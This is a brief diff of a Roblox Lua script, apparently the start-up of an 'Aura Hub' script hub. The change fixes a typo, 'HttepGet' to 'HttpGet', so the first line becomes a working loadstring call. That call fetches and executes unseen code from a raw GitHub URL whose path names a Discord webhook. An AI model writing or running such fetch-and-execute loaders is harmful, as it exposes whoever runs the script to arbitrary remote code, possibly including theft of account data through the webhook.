@@ -1,4 +1,4 @@
-loadstring(game:HttepGet("https://raw.githubusercontent.com/aurahubalpha/Webhook/refs/heads/main/DMTinyskullrblxOnDiscordForFreewebhook"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/aurahubalpha/Webhook/refs/heads/main/DMTinyskullrblxOnDiscordForFreewebhook"))()
 
 local GameID = game.PlaceId
 print("🎮 Aura Hub is starting up...")
